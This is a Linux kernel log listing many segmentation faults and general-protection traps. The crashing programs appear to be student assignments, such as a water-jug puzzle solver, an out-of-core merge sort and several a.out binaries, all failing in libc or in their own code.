[4611561.131674] waterjugpuzzle[8372]: segfault at 19 ip 00007f27522bd512 sp 00007ffe1cf08430 error 4 in libc-2.23.so[7f2752239000+1c0000]
[4611561.252227] waterjugpuzzle[8376]: segfault at 19 ip 00007f93ea6d7512 sp 00007fff9196b4f0 error 4 in libc-2.23.so[7f93ea653000+1c0000]
[4611561.370390] waterjugpuzzle[8380]: segfault at 19 ip 00007f3c66e96512 sp 00007ffdac826e70 error 4 in libc-2.23.so[7f3c66e12000+1c0000]
[4611561.492631] waterjugpuzzle[8384]: segfault at 19 ip 00007f3580978512 sp 00007ffdf9498310 error 4 in libc-2.23.so[7f35808f4000+1c0000]
[4611561.614581] waterjugpuzzle[8388]: segfault at 19 ip 00007fc966c6a512 sp 00007ffc7f05e370 error 4 in libc-2.23.so[7fc966be6000+1c0000]
[4611561.735742] waterjugpuzzle[8392]: segfault at 19 ip 00007f58d95a8512 sp 00007ffe493334c0 error 4 in libc-2.23.so[7f58d9524000+1c0000]
[4611561.856688] waterjugpuzzle[8396]: segfault at 19 ip 00007f21db4db512 sp 00007ffe2a3eebc0 error 4 in libc-2.23.so[7f21db457000+1c0000]
[4611561.981696] waterjugpuzzle[8400]: segfault at 19 ip 00007f6539855512 sp 00007ffce32928a0 error 4 in libc-2.23.so[7f65397d1000+1c0000]
[4615394.508937] show_signal_msg: 3 callbacks suppressed
[4615394.508942] waterjugpuzzle[10380]: segfault at 0 ip 0000000000402254 sp 00007ffe531c7f20 error 4 in waterjugpuzzle[400000+a000]
[4615394.658210] waterjugpuzzle[10384]: segfault at 0 ip 0000000000402254 sp 00007fffebce47b0 error 4 in waterjugpuzzle[400000+a000]
[4615394.818916] waterjugpuzzle[10388]: segfault at 0 ip 0000000000402254 sp 00007ffee220cac0 error 4 in waterjugpuzzle[400000+a000]
[4615394.963819] waterjugpuzzle[10392]: segfault at 0 ip 0000000000402254 sp 00007ffdb538aa40 error 4 in waterjugpuzzle[400000+a000]
[4615395.113759] waterjugpuzzle[10399]: segfault at 0 ip 0000000000402254 sp 00007fff56765960 error 4 in waterjugpuzzle[400000+a000]
[4615395.244312] waterjugpuzzle[10403]: segfault at 0 ip 0000000000402254 sp 00007ffca00cd350 error 4 in waterjugpuzzle[400000+a000]
[4615395.362377] waterjugpuzzle[10407]: segfault at 1 ip 0000000000402254 sp 00007ffc70ff5400 error 4 in waterjugpuzzle[400000+a000]
[4615395.484124] waterjugpuzzle[10411]: segfault at 0 ip 0000000000402254 sp 00007fffebd9c300 error 4 in waterjugpuzzle[400000+a000]
[4615395.651124] waterjugpuzzle[10415]: segfault at 0 ip 0000000000402254 sp 00007ffc457d5200 error 4 in waterjugpuzzle[400000+a000]
[4615395.798168] waterjugpuzzle[10419]: segfault at 0 ip 0000000000402254 sp 00007fff01ae44f0 error 4 in waterjugpuzzle[400000+a000]
[4617050.235662] show_signal_msg: 2 callbacks suppressed
[4617050.235669] waterjugpuzzle[11622]: segfault at 0 ip 0000000000402254 sp 00007fff847a66c0 error 4 in waterjugpuzzle[400000+a000]
[4617050.388836] waterjugpuzzle[11626]: segfault at 0 ip 0000000000402254 sp 00007ffc9c3b0800 error 4 in waterjugpuzzle[400000+a000]
[4617050.536948] waterjugpuzzle[11630]: segfault at 0 ip 0000000000402254 sp 00007ffc65330cc0 error 4 in waterjugpuzzle[400000+a000]
[4617050.682517] waterjugpuzzle[11634]: segfault at 0 ip 0000000000402254 sp 00007ffcd19a2800 error 4 in waterjugpuzzle[400000+a000]
[4617050.819304] waterjugpuzzle[11641]: segfault at 0 ip 0000000000402254 sp 00007ffdfa749800 error 4 in waterjugpuzzle[400000+a000]
[4617050.935338] waterjugpuzzle[11645]: segfault at 0 ip 0000000000402254 sp 00007fffb20555a0 error 4 in waterjugpuzzle[400000+a000]
[4617051.051287] waterjugpuzzle[11649]: segfault at 1 ip 0000000000402254 sp 00007ffea4a48b30 error 4 in waterjugpuzzle[400000+a000]
[4617051.172803] waterjugpuzzle[11653]: segfault at 0 ip 0000000000402254 sp 00007ffe3dfe3d60 error 4 in waterjugpuzzle[400000+a000]
[4617051.293387] waterjugpuzzle[11658]: segfault at 0 ip 0000000000402254 sp 00007ffc31730e00 error 4 in waterjugpuzzle[400000+a000]
[4617051.409839] waterjugpuzzle[11662]: segfault at 0 ip 0000000000402254 sp 00007ffebe26eec0 error 4 in waterjugpuzzle[400000+a000]
[4690160.619648] show_signal_msg: 2 callbacks suppressed
[4690160.619655] vuln_prog2.bin[1272]: segfault at 0 ip 00007f8d82d26bf7 sp 00007ffc5d1f9548 error 4 in libc-2.23.so[7f8d82c81000+1c0000]
[4690167.896049] vuln_prog2.bin[1275]: segfault at 0 ip 00007f84918d7bf7 sp 00007ffdb05361a8 error 4 in libc-2.23.so[7f8491832000+1c0000]
[4696336.897765] hw2[3778]: segfault at 0 ip 00007f4b48d36d9e sp 00007ffcf359bb60 error 6 in libc-2.23.so[7f4b48cba000+1c0000]
[4696348.954603] hw2[3783]: segfault at 0 ip 00007fe64442ed9e sp 00007fff41366790 error 6 in libc-2.23.so[7fe6443b2000+1c0000]
[4761314.264087] oocmerge[25552]: segfault at a00b842 ip 0000000000400a3f sp 00007ffc31547b50 error 6 in oocmerge[400000+2000]
[4761434.080266] oocmerge[25580]: segfault at 3ac11d36 ip 0000000000400a3f sp 00007fffed104d80 error 6 in oocmerge[400000+2000]
[4761458.019203] oocmerge[25616]: segfault at 36c344bc ip 0000000000400a3f sp 00007ffccafab890 error 6 in oocmerge[400000+2000]
[4761574.263526] oocmerge[25734]: segfault at a2d17a4 ip 0000000000400a3f sp 00007ffe1870f0a0 error 6 in oocmerge[400000+2000]
[4761681.762193] oocmerge[25781]: segfault at 27a855e7 ip 0000000000400a58 sp 00007ffe92b4a510 error 6 in oocmerge[400000+2000]
[4761745.028435] oocmerge[25823]: segfault at 37e62f49 ip 0000000000400a71 sp 00007fff4aaeb9e0 error 6 in oocmerge[400000+2000]
[4761813.916817] oocmerge[25960]: segfault at 0 ip 0000000000400a58 sp 00007fff4b937b90 error 6 in oocmerge[400000+2000]
[4761866.777815] oocmerge[26005]: segfault at 0 ip 0000000000400a58 sp 00007ffd9699ab00 error 6 in oocmerge[400000+2000]
[4761960.644879] oocmerge[26043]: segfault at 0 ip 0000000000400a58 sp 00007ffd9ae94c30 error 6 in oocmerge[400000+2000]
[4762008.607410] oocmerge[26084]: segfault at 0 ip 0000000000400a71 sp 00007ffca77c5440 error 6 in oocmerge[400000+2000]
[4762043.367012] oocmerge[26097]: segfault at 0 ip 00007fcfe080a6f8 sp 00007fffe31d8a50 error 4 in libc-2.23.so[7fcfe079c000+1c0000]
[4762134.793632] oocmerge[26135]: segfault at 2a360678 ip 0000000000400a7e sp 00007ffc41eed4e0 error 6 in oocmerge[400000+2000]
[4762283.221299] oocmerge[26181]: segfault at 0 ip 0000000000400b9f sp 00007ffeedc4e7b0 error 6 in oocmerge[400000+2000]
[4768310.825234] traps: oocmerge[28811] general protection ip:7fab6462160d sp:7fff10d11a40 error:0 in libc-2.23.so[7fab645a7000+1c0000]
[4768453.363601] oocmerge[28871]: segfault at 0 ip 00007f8ba527a1ba sp 00007ffe19ef8fa0 error 4 in libc-2.23.so[7f8ba520c000+1c0000]
[4768492.938537] oocmerge[28885]: segfault at 0 ip 00007fce0f6ca1ba sp 00007ffe16615640 error 4 in libc-2.23.so[7fce0f65c000+1c0000]
[4768875.660241] oocmerge[28996]: segfault at 0 ip 00007faf3caee1ba sp 00007fff15f31d50 error 4 in libc-2.23.so[7faf3ca80000+1c0000]
[4769365.083433] oocmerge[29345]: segfault at 10 ip 00007fbe61774e10 sp 00007fff8f5fd4d0 error 6 in libc-2.23.so[7fbe616f3000+1c0000]
[4769378.362251] mergeSort[29354]: segfault at 0 ip 00007f1fba94f1ba sp 00007ffc4f4755c0 error 4 in libc-2.23.so[7f1fba8e1000+1c0000]
[4769383.290667] mergeSort[29357]: segfault at 0 ip 00007f256e37f6f8 sp 00007ffeff15ee40 error 4 in libc-2.23.so[7f256e311000+1c0000]
[4769403.808904] oocmerge[29369]: segfault at 0 ip 00007f02f08d76f8 sp 00007ffdd63a1240 error 4 in libc-2.23.so[7f02f0869000+1c0000]
[4769412.512190] mergeSort[29386]: segfault at 0 ip 00007f13028616f8 sp 00007fff35d34620 error 4 in libc-2.23.so[7f13027f3000+1c0000]
[4769424.656771] oocmerge[29406]: segfault at 0 ip 00007f5449a3b6f8 sp 00007fff602e2fb0 error 4 in libc-2.23.so[7f54499cd000+1c0000]
[4769444.359923] mergeSort[29440]: segfault at 0 ip 00007f11799d96f8 sp 00007ffcb62e81e0 error 4 in libc-2.23.so[7f117996b000+1c0000]
[4769458.897713] mergeSort[29455]: segfault at 0 ip 00007fd9ecbf46f8 sp 00007fffb4ffd000 error 4 in libc-2.23.so[7fd9ecb86000+1c0000]
[4769467.371963] mergeSort[29458]: segfault at 0 ip 00007ff1c4fe76f8 sp 00007ffde6820f60 error 4 in libc-2.23.so[7ff1c4f79000+1c0000]
[4769472.672758] oocmerge[29464]: segfault at 0 ip 00007ff3676d36f8 sp 00007fff560d6760 error 4 in libc-2.23.so[7ff367665000+1c0000]
[4769501.533326] oocmerge[29502]: segfault at 0 ip 00007f81788a46f8 sp 00007fffc9b9e280 error 4 in libc-2.23.so[7f8178836000+1c0000]
[4769530.158269] oocmerge[29569]: segfault at 0 ip 00007f245b1c46f8 sp 00007ffea681c680 error 4 in libc-2.23.so[7f245b156000+1c0000]
[4769536.496547] oocmerge[29582]: segfault at 0 ip 00007f85a90e36f8 sp 00007fff0ab52350 error 4 in libc-2.23.so[7f85a9075000+1c0000]
[4769569.604489] oocmerge[29609]: segfault at 0 ip 00007fdbbd17f6f8 sp 00007ffcb3e24800 error 4 in libc-2.23.so[7fdbbd111000+1c0000]
[4769597.672344] oocmerge[29678]: segfault at 0 ip 00007f84fa1386f8 sp 00007ffcb246ec10 error 4 in libc-2.23.so[7f84fa0ca000+1c0000]
[4769606.967914] mergeSort[29692]: segfault at 0 ip 00007f0ecb7e76f8 sp 00007ffca0fd25a0 error 4 in libc-2.23.so[7f0ecb779000+1c0000]
[4769626.634130] oocmerge[29712]: segfault at 0 ip 00007f82f11b96f8 sp 00007fff22f6c990 error 4 in libc-2.23.so[7f82f114b000+1c0000]
[4769658.679533] oocmerge[29740]: segfault at 0 ip 00007f6aaa0816f8 sp 00007fff1bb654a0 error 4 in libc-2.23.so[7f6aaa013000+1c0000]
[4769673.156746] mergeSort[29748]: segfault at 0 ip 00007fe44176c6f8 sp 00007ffd8d37ee20 error 4 in libc-2.23.so[7fe4416fe000+1c0000]
[4769712.501424] oocmerge[29776]: segfault at 0 ip 00007efc7bf186f8 sp 00007ffd93c5d660 error 4 in libc-2.23.so[7efc7beaa000+1c0000]
[4769742.201421] oocmerge[29806]: segfault at 0 ip 00007f17b3b8b6f8 sp 00007ffefab7f9e0 error 4 in libc-2.23.so[7f17b3b1d000+1c0000]
[4769751.551154] oocmerge[29816]: segfault at 0 ip 00007f866f12e6f8 sp 00007ffc3009cab0 error 4 in libc-2.23.so[7f866f0c0000+1c0000]
[4769756.379831] oocmerge[29828]: segfault at 0 ip 00007f68a82e76f8 sp 00007fff11f10cd0 error 4 in libc-2.23.so[7f68a8279000+1c0000]
[4769757.465109] oocmerge[29830]: segfault at 0 ip 00007f1f1c3b26f8 sp 00007ffcce66c050 error 4 in libc-2.23.so[7f1f1c344000+1c0000]
[4769799.601624] oocmerge[29847]: segfault at 0 ip 00007fe20ce0c6f8 sp 00007ffe6ff0e3e0 error 4 in libc-2.23.so[7fe20cd9e000+1c0000]
[4769801.158500] oocmerge[29849]: segfault at 0 ip 00007f54da87f6f8 sp 00007ffd1ef25e00 error 4 in libc-2.23.so[7f54da811000+1c0000]
[4769802.273621] oocmerge[29851]: segfault at 0 ip 00007fc1020b16f8 sp 00007ffd7a78b8a0 error 4 in libc-2.23.so[7fc102043000+1c0000]
[4769803.356629] oocmerge[29853]: segfault at 0 ip 00007f0eb97916f8 sp 00007fffe0a6dc00 error 4 in libc-2.23.so[7f0eb9723000+1c0000]
[4769805.642306] oocmerge[29855]: segfault at 0 ip 00007fc1a13016f8 sp 00007ffde06640f0 error 4 in libc-2.23.so[7fc1a1293000+1c0000]
[4769806.834618] oocmerge[29857]: segfault at 0 ip 00007fdafd7c66f8 sp 00007ffd6c967ef0 error 4 in libc-2.23.so[7fdafd758000+1c0000]
[4769871.932517] oocmerge[29875]: segfault at 0 ip 00007f38c203d6f8 sp 00007ffdaedc5e70 error 4 in libc-2.23.so[7f38c1fcf000+1c0000]
[4769903.333128] oocmerge[29896]: segfault at 0 ip 00007fe9a5b586f8 sp 00007fff924ee5a0 error 4 in libc-2.23.so[7fe9a5aea000+1c0000]
[4770025.750234] oocmerge[30093]: segfault at 0 ip 00007fef6b1246f8 sp 00007ffe6737da80 error 4 in libc-2.23.so[7fef6b0b6000+1c0000]
[4770027.747814] oocmerge[30095]: segfault at 0 ip 00007f2d4daf76f8 sp 00007fff72ecd2a0 error 4 in libc-2.23.so[7f2d4da89000+1c0000]
[4770028.784128] oocmerge[30097]: segfault at 0 ip 00007f260ec936f8 sp 00007ffe76173d40 error 4 in libc-2.23.so[7f260ec25000+1c0000]
[4770055.694760] oocmerge[30112]: segfault at 0 ip 00007f075e40d6f8 sp 00007ffd0557f9b0 error 4 in libc-2.23.so[7f075e39f000+1c0000]
[4770057.546750] oocmerge[30114]: segfault at 0 ip 00007f097129b6f8 sp 00007ffcc61767c0 error 4 in libc-2.23.so[7f097122d000+1c0000]
[4770085.564261] oocmerge[30129]: segfault at 0 ip 00007f82d76b16f8 sp 00007ffed18e8960 error 4 in libc-2.23.so[7f82d7643000+1c0000]
[4770088.136117] oocmerge[30131]: segfault at 0 ip 00007f2875caf6f8 sp 00007fff9afb7b30 error 4 in libc-2.23.so[7f2875c41000+1c0000]
[4770089.182477] oocmerge[30133]: segfault at 0 ip 00007f52577a86f8 sp 00007fff04674f70 error 4 in libc-2.23.so[7f525773a000+1c0000]
[4770089.897573] oocmerge[30135]: segfault at 0 ip 00007fc71d7326f8 sp 00007ffce66139c0 error 4 in libc-2.23.so[7fc71d6c4000+1c0000]
[4770249.512537] oocmerge[30194]: segfault at 0 ip 00007fcc9f0c56f8 sp 00007ffd92e4b440 error 4 in libc-2.23.so[7fcc9f057000+1c0000]
[4770443.306469] oocmerge[30246]: segfault at 0 ip 00007eff1e2cf6f8 sp 00007ffe5ea7b650 error 4 in libc-2.23.so[7eff1e261000+1c0000]
[4770510.257764] a.out[30269]: segfault at 0 ip 00007f3fbd0d66f8 sp 00007ffc782fc610 error 4 in libc-2.23.so[7f3fbd068000+1c0000]
[4770617.600286] oocmerge[30306]: segfault at 0 ip 00007ff7817036f8 sp 00007fff9398f9f0 error 4 in libc-2.23.so[7ff781695000+1c0000]
[4770711.605275] oocmerge[30353]: segfault at 0 ip 00007f71c965b6f8 sp 00007ffc5d5b3910 error 4 in libc-2.23.so[7f71c95ed000+1c0000]
[4770812.062447] oocmerge[30383]: segfault at 0 ip 00007f01540a86f8 sp 00007ffee0a9cec0 error 4 in libc-2.23.so[7f015403a000+1c0000]
[4770912.350082] oocmerge[30518]: segfault at 0 ip 00007faaa47416f8 sp 00007ffefa68b160 error 4 in libc-2.23.so[7faaa46d3000+1c0000]
[4770937.455446] oocmerge[30541]: segfault at 0 ip 00007f0b342236f8 sp 00007ffd05e6a000 error 4 in libc-2.23.so[7f0b341b5000+1c0000]
[4771016.258521] oocmerge[30647]: segfault at 0 ip 00007f20442166f8 sp 00007ffde52fa930 error 4 in libc-2.23.so[7f20441a8000+1c0000]
[4771086.604889] oocmerge[30782]: segfault at 0 ip 00007f752aea96f8 sp 00007ffdd30ff370 error 4 in libc-2.23.so[7f752ae3b000+1c0000]
[4771322.623992] oocmerge[30901]: segfault at 0 ip 00007fd43919f6f8 sp 00007ffdc31af600 error 4 in libc-2.23.so[7fd439131000+1c0000]
[4771438.084636] a.out[30961]: segfault at 0 ip 00007fc6814286f8 sp 00007ffcca83a6a0 error 4 in libc-2.23.so[7fc6813ba000+1c0000]
[4772082.077812] a.out[31354]: segfault at 0 ip 00007f71338b66f8 sp 00007ffc0b596490 error 4 in libc-2.23.so[7f7133848000+1c0000]
[4773754.940600] a.out[32276]: segfault at 0 ip 00007f793c15e6f8 sp 00007fff8628e2b0 error 4 in libc-2.23.so[7f793c0f0000+1c0000]
[4773793.722548] a.out[32293]: segfault at 0 ip 00007ff58fe0b6f8 sp 00007fffc478edf0 error 4 in libc-2.23.so[7ff58fd9d000+1c0000]
[4773839.350116] a.out[32316]: segfault at 0 ip 00007f7dcc3806f8 sp 00007ffc7314aa60 error 4 in libc-2.23.so[7f7dcc312000+1c0000]
[4773887.344046] a.out[32355]: segfault at 0 ip 00007f9f7426a6f8 sp 00007ffe08016b20 error 4 in libc-2.23.so[7f9f741fc000+1c0000]
[4773969.939395] a.out[32406]: segfault at 0 ip 00007f3b575c56f8 sp 00007ffe6f8d7270 error 4 in libc-2.23.so[7f3b57557000+1c0000]
[4774144.859091] a.out[32456]: segfault at 0 ip 00007f0ef1a4a6f8 sp 00007ffed269b2f0 error 4 in libc-2.23.so[7f0ef19dc000+1c0000]
[4774287.056918] a.out[32504]: segfault at 0 ip 00007f97830b36f8 sp 00007ffda96a6fa0 error 4 in libc-2.23.so[7f9783045000+1c0000]
[4774371.506885] a.out[32598]: segfault at 0 ip 00007fd45aa7b6f8 sp 00007ffe47d75670 error 4 in libc-2.23.so[7fd45aa0d000+1c0000]
[4774392.447822] a.out[32615]: segfault at 0 ip 00007ff7f87b26f8 sp 00007ffd5d3f6610 error 4 in libc-2.23.so[7ff7f8744000+1c0000]
[4774464.251469] a.out[32656]: segfault at 0 ip 00007fcfdf9766f8 sp 00007fff95a30f80 error 4 in libc-2.23.so[7fcfdf908000+1c0000]
[4774487.816719] a.out[32667]: segfault at 0 ip 00007fa1bea516f8 sp 00007ffc111f9240 error 4 in libc-2.23.so[7fa1be9e3000+1c0000]
[4774519.673344] a.out[32682]: segfault at 0 ip 00007f00715586f8 sp 00007fff27899ea0 error 4 in libc-2.23.so[7f00714ea000+1c0000]
[4774632.740083] a.out[402]: segfault at 0 ip 00007f9770ec76f8 sp 00007ffe576030a0 error 4 in libc-2.23.so[7f9770e59000+1c0000]
[4774759.513510] a.out[499]: segfault at 0 ip 00007f37e996a4a1 sp 00007ffd6b3656c0 error 4 in libc-2.23.so[7f37e98fc000+1c0000]
[4774793.566205] a.out[514]: segfault at 0 ip 00007fdb02bcf4a1 sp 00007ffe1056c920 error 4 in libc-2.23.so[7fdb02b61000+1c0000]
[4775049.536850] a.out[699]: segfault at 0 ip 00007f4a37cd06f8 sp 00007ffe13ba7fe0 error 4 in libc-2.23.so[7f4a37c62000+1c0000]
[4775094.850952] a.out[744]: segfault at 0 ip 00007f4607f7e6f8 sp 00007ffcbd446c50 error 4 in libc-2.23.so[7f4607f10000+1c0000]
[4775100.257063] a.out[751]: segfault at 0 ip 00007f892189d6f8 sp 00007ffdafa071c0 error 4 in libc-2.23.so[7f892182f000+1c0000]
[4775260.932246] a.out[838]: segfault at 0 ip 00007ffb037d16f8 sp 00007fff5fb96d50 error 4 in libc-2.23.so[7ffb03763000+1c0000]
[4775347.575234] a.out[898]: segfault at 0 ip 00007f45e44026f8 sp 00007ffdd4eda0d0 error 4 in libc-2.23.so[7f45e4394000+1c0000]
[4775458.522932] a.out[1268]: segfault at 0 ip 00007fe55fb7c6f8 sp 00007ffc4e199a50 error 4 in libc-2.23.so[7fe55fb0e000+1c0000]
[4775935.818183] oocmerge.out[1863]: segfault at 0 ip 00007f53deb31f01 sp 00007ffd4f4571d0 error 4 in libc-2.23.so[7f53deabc000+1c0000]
[4776013.745557] oocmerge.out[1901]: segfault at 0 ip 00007f4ce8298f01 sp 00007ffddb76b1a0 error 4 in libc-2.23.so[7f4ce8223000+1c0000]
[4776049.493982] oocmerge.out[1927]: segfault at 0 ip 00007f3002894f01 sp 00007ffc4b5bbba0 error 4 in libc-2.23.so[7f300281f000+1c0000]
[4776101.432710] oocmerge.out[1995]: segfault at 0 ip 00007f6aa85f1f01 sp 00007ffc39cc5ad0 error 4 in libc-2.23.so[7f6aa857c000+1c0000]
[4776387.307135] a.out[2086]: segfault at 0 ip 00007f4173ed26f8 sp 00007ffd3bdfd270 error 4 in libc-2.23.so[7f4173e64000+1c0000]
[4776762.653847] oocmerge.out[2242]: segfault at 0 ip 00007fed0438ff01 sp 00007ffd9c154f10 error 4 in libc-2.23.so[7fed0431a000+1c0000]
[4777644.645237] a.out[2665]: segfault at 0 ip 00007fdc9a79b6f8 sp 00007ffcaee1b580 error 4 in libc-2.23.so[7fdc9a72d000+1c0000]
[4777890.562672] a.out[2731]: segfault at 0 ip 00007fe37a32c6f8 sp 00007ffc33660ec0 error 4 in libc-2.23.so[7fe37a2be000+1c0000]
[4778095.434157] a.out[2817]: segfault at 0 ip 00007fa68518c6f8 sp 00007fffeb62aae0 error 4 in libc-2.23.so[7fa68511e000+1c0000]
[4778147.086520] oocmerge.out[2827]: segfault at 0 ip 00007f0851f18264 sp 00007ffce3d899a0 error 4 in libc-2.23.so[7f0851eab000+1c0000]
[4778256.190806] a.out[2867]: segfault at 0 ip 00007f39b0c5f6f8 sp 00007fff32641770 error 4 in libc-2.23.so[7f39b0bf1000+1c0000]
[4778320.814919] a.out[2886]: segfault at 0 ip 00007fd90da716f8 sp 00007ffe98f860f0 error 4 in libc-2.23.so[7fd90da03000+1c0000]
[4778636.211843] a.out[3114]: segfault at 0 ip 00007fc0a51296f8 sp 00007ffee390c0a0 error 4 in libc-2.23.so[7fc0a50bb000+1c0000]
[4778836.393453] a.out[3182]: segfault at 0 ip 00007fe486f8c6f8 sp 00007ffd59f40c00 error 4 in libc-2.23.so[7fe486f1e000+1c0000]
[4778900.923782] a.out[3211]: segfault at 0 ip 00007f31e42616f8 sp 00007ffff47ee990 error 4 in libc-2.23.so[7f31e41f3000+1c0000]
[4779049.718933] a.out[3390]: segfault at 0 ip 00007fda9ad166f8 sp 00007fff2103c590 error 4 in libc-2.23.so[7fda9aca8000+1c0000]
[4779054.124327] a.out[3399]: segfault at 0 ip 00007fa68926b6f8 sp 00007ffeaf131640 error 4 in libc-2.23.so[7fa6891fd000+1c0000]
[4779190.474640] a.out[3520]: segfault at 0 ip 00007f1f1059d6f8 sp 00007ffc9e3e6150 error 4 in libc-2.23.so[7f1f1052f000+1c0000]
[4779521.608437] traps: oocmerge[3765] general protection ip:7fcf0901060d sp:7ffc6bd93140 error:0 in libc-2.23.so[7fcf08f96000+1c0000]
[4779607.427247] traps: oocmerge[3802] general protection ip:7f28d7af0e10 sp:7ffe2c2412f0 error:0 in libc-2.23.so[7f28d7a6f000+1c0000]
[4780142.029887] oocmerge[3996]: segfault at 0 ip 00007f9087b1f1ba sp 00007ffe7f026870 error 4 in libc-2.23.so[7f9087ab1000+1c0000]
[4780163.055019] oocmerge[4011]: segfault at 0 ip 00007febff0b31ba sp 00007fff122f43a0 error 4 in libc-2.23.so[7febff045000+1c0000]
[4780237.344305] oocmerge[4034]: segfault at 0 ip 00007f3d306761ba sp 00007ffcb0ef64b0 error 4 in libc-2.23.so[7f3d30608000+1c0000]
[4780239.444640] oocmerge[4037]: segfault at 0 ip 00007fb3ce5771ba sp 00007ffd9dd4a870 error 4 in libc-2.23.so[7fb3ce509000+1c0000]
[4780240.350034] oocmerge[4039]: segfault at 0 ip 00007f978983a1ba sp 00007ffe1eee5170 error 4 in libc-2.23.so[7f97897cc000+1c0000]
[4780241.223051] oocmerge[4041]: segfault at 0 ip 00007fc87a2d31ba sp 00007ffff6c3f6f0 error 4 in libc-2.23.so[7fc87a265000+1c0000]
[4780242.060804] oocmerge[4043]: segfault at 0 ip 00007fcc4e4f71ba sp 00007ffdbf24dce0 error 4 in libc-2.23.so[7fcc4e489000+1c0000]
[4780252.350334] oocmerge[4048]: segfault at 0 ip 00007fd6750071ba sp 00007ffdfe2c8020 error 4 in libc-2.23.so[7fd674f99000+1c0000]
[4780337.560908] oocmerge[4106]: segfault at 0 ip 00007f3584aea1ba sp 00007fffbca66900 error 4 in libc-2.23.so[7f3584a7c000+1c0000]
[4780390.690150] oocmerge[4138]: segfault at 0 ip 00007f68b985e1ba sp 00007ffdc5b0ed00 error 4 in libc-2.23.so[7f68b97f0000+1c0000]
[4780611.019418] oocmerge[4192]: segfault at 0 ip 00007fa831bb31ba sp 00007ffc6dad5900 error 4 in libc-2.23.so[7fa831b45000+1c0000]
[4781118.986298] oocmerge[4443]: segfault at 0 ip 00007f16069446f8 sp 00007fff2452b8b0 error 4 in libc-2.23.so[7f16068d6000+1c0000]
[4781125.922574] oocmerge[4447]: segfault at 0 ip 00007f12328486f8 sp 00007ffe05951c40 error 4 in libc-2.23.so[7f12327da000+1c0000]
[4781127.226283] oocmerge[4449]: segfault at 0 ip 00007f04414a06f8 sp 00007ffc51dad820 error 4 in libc-2.23.so[7f0441432000+1c0000]
[4781128.104485] oocmerge[4451]: segfault at 0 ip 00007f1d6d9b56f8 sp 00007ffd965507a0 error 4 in libc-2.23.so[7f1d6d947000+1c0000]
[4781129.214233] oocmerge[4453]: segfault at 0 ip 00007f42049b56f8 sp 00007ffd5ca223c0 error 4 in libc-2.23.so[7f4204947000+1c0000]
[4781130.066838] oocmerge[4455]: segfault at 0 ip 00007f6b97d3d6f8 sp 00007fff01750b60 error 4 in libc-2.23.so[7f6b97ccf000+1c0000]
[4781133.052186] oocmerge[4457]: segfault at 0 ip 00007fed6eadb6f8 sp 00007ffe6b11ccf0 error 4 in libc-2.23.so[7fed6ea6d000+1c0000]
[4781134.152397] oocmerge[4459]: segfault at 0 ip 00007f94cccb16f8 sp 00007ffdc7897f50 error 4 in libc-2.23.so[7f94ccc43000+1c0000]
[4781136.015462] oocmerge[4462]: segfault at 0 ip 00007f9315fb26f8 sp 00007ffe7739ea60 error 4 in libc-2.23.so[7f9315f44000+1c0000]
[4781136.676023] oocmerge[4464]: segfault at 0 ip 00007fa7a5b056f8 sp 00007ffcbfe77810 error 4 in libc-2.23.so[7fa7a5a97000+1c0000]
[4781137.598887] oocmerge[4467]: segfault at 0 ip 00007f24991116f8 sp 00007fff92489ba0 error 4 in libc-2.23.so[7f24990a3000+1c0000]
[4781140.172781] oocmerge[4469]: segfault at 0 ip 00007f914d5356f8 sp 00007ffe11079360 error 4 in libc-2.23.so[7f914d4c7000+1c0000]
[4781143.505691] oocmerge[4471]: segfault at 0 ip 00007fb9d77aac4f sp 00007ffebddd2c20 error 4 in libc-2.23.so[7fb9d7735000+1c0000]
[4781145.104661] oocmerge[4473]: segfault at 0 ip 00007f5105c24c4f sp 00007ffc5169a7b0 error 4 in libc-2.23.so[7f5105baf000+1c0000]
[4781307.452580] oocmerge[4529]: segfault at 0 ip 00007fa6c47eec4f sp 00007fffb241ec50 error 4 in libc-2.23.so[7fa6c4779000+1c0000]
[4781370.948552] oocmerge[4568]: segfault at 0 ip 00007f861e4be1ba sp 00007ffd015456a0 error 4 in libc-2.23.so[7f861e450000+1c0000]
[4781407.276141] oocmerge[4590]: segfault at 0 ip 00007f2ba54db1ba sp 00007ffcb0b1fc60 error 4 in libc-2.23.so[7f2ba546d000+1c0000]
[4781923.152648] oocmerge[4725]: segfault at 0 ip 00007ff9100021ba sp 00007fffb9b23090 error 4 in libc-2.23.so[7ff90ff94000+1c0000]
[4782108.863466] oocmerge[4788]: segfault at 0 ip 00007f0c9fb581ba sp 00007ffe54ffc9d0 error 4 in libc-2.23.so[7f0c9faea000+1c0000]
[4782777.083832] oocmerge[5091]: segfault at 0 ip 00007fa168fdc6f8 sp 00007ffee0f98570 error 4 in libc-2.23.so[7fa168f6e000+1c0000]
[4782781.936125] oocmerge[5093]: segfault at 0 ip 00007f72faeab6f8 sp 00007ffcaa28a000 error 4 in libc-2.23.so[7f72fae3d000+1c0000]
[4782790.370853] oocmerge[5097]: segfault at 0 ip 00007f3f40a246f8 sp 00007ffc30077570 error 4 in libc-2.23.so[7f3f409b6000+1c0000]
[4782799.429784] oocmerge[5099]: segfault at 0 ip 00007fdeea6216f8 sp 00007ffe8c9e5890 error 4 in libc-2.23.so[7fdeea5b3000+1c0000]
[4783005.092763] oocmerge[5225]: segfault at 0 ip 00007f4af7c486f8 sp 00007ffe25dcc190 error 4 in libc-2.23.so[7f4af7bda000+1c0000]
[4783016.321186] oocmerge[5241]: segfault at 0 ip 00007f97cbb7d6f8 sp 00007ffd92c5cc90 error 4 in libc-2.23.so[7f97cbb0f000+1c0000]
[4783022.285295] oocmerge[5243]: segfault at 0 ip 00007f9e7d5756f8 sp 00007ffc9ef22db0 error 4 in libc-2.23.so[7f9e7d507000+1c0000]
[4783024.231469] oocmerge[5245]: segfault at 0 ip 00007fb9e4dae6f8 sp 00007fff57954490 error 4 in libc-2.23.so[7fb9e4d40000+1c0000]
[4783025.599958] oocmerge[5247]: segfault at 0 ip 00007f34821256f8 sp 00007ffce4c45d60 error 4 in libc-2.23.so[7f34820b7000+1c0000]
[4783045.437133] a.out[5258]: segfault at 0 ip 00007fe9ea3216f8 sp 00007fff17e632a0 error 4 in libc-2.23.so[7fe9ea2b3000+1c0000]
[4783119.308505] a.out[5278]: segfault at 0 ip 00007f2678a586f8 sp 00007ffc88aef740 error 4 in libc-2.23.so[7f26789ea000+1c0000]
[4783176.815661] a.out[5310]: segfault at 0 ip 00007fcd5505c6f8 sp 00007ffde5b3fbe0 error 4 in libc-2.23.so[7fcd54fee000+1c0000]
